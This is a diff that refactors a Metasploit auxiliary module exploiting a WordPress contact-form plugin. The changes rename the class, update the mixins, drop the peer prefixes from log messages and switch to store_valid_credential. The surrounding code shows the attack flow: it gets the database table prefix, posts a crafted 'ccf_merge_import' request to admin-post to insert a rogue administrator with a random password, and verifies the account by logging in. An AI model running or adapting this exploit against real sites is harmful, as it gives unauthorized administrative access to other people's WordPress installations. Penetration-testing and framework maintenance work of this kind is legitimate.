@@ -1,11 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
-  include Msf::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
     super(update_info(info,
@@ -66,13 +66,13 @@ class Metasploit3 < Msf::Auxiliary
     username = Rex::Text.rand_text_alpha(10)
     password = Rex::Text.rand_text_alpha(20)
 
-    print_status("#{peer} - Trying to get table_prefix")
+    print_status("Trying to get table_prefix")
     table_prefix = get_table_prefix
     if table_prefix.nil?
-      print_error("#{peer} - Unable to get table_prefix")
+      print_error("Unable to get table_prefix")
       return
     else
-      print_status("#{peer} - got table_prefix '#{table_prefix}'")
+      print_status("got table_prefix '#{table_prefix}'")
     end
 
     data = Rex::MIME::Message.new
@@ -80,7 +80,7 @@ class Metasploit3 < Msf::Auxiliary
     data.add_part('1', nil, nil, 'form-data; name="ccf_merge_import"')
     post_data = data.to_s
 
-    print_status("#{peer} - Inserting user #{username} with password #{password}")
+    print_status("Inserting user #{username} with password #{password}")
     res = send_request_cgi(
       'method'   => 'POST',
       'uri'      => wordpress_url_admin_post,
@@ -95,21 +95,13 @@ class Metasploit3 < Msf::Auxiliary
     # test login
     cookie = wordpress_login(username, password)
 
-    # login successfull
+    # login successful
     if cookie
-      print_status("#{peer} - User #{username} with password #{password} successfully created")
-      report_auth_info(
-        sname: 'WordPress',
-        host: rhost,
-        port: rport,
-        user: username,
-        pass: password,
-        active: true
-    )
+      print_good("User #{username} with password #{password} successfully created")
+      store_valid_credential(user: username, private: password, proof: cookie)
     else
-      print_error("#{peer} - User creation failed")
+      print_error("User creation failed")
       return
     end
   end
-
 end
